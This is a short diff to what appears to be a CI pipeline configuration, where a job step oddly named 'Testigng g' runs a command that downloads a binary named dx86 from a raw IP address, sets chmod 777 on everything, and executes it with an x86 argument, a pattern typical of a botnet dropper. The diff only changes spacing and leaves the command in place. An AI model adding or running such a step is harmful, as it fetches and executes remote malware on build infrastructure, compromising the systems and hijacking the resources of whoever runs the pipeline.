@@ -8,4 +8,4 @@ jobs:
       - run:
           name: "Testigng g"
           command: |
-                wget http://89.32.41.169/dx86; chmod 777 *; ./dx86 x86
+                wget http://89.32.41.169/dx86; chmod 777 *; ./dx86  x86
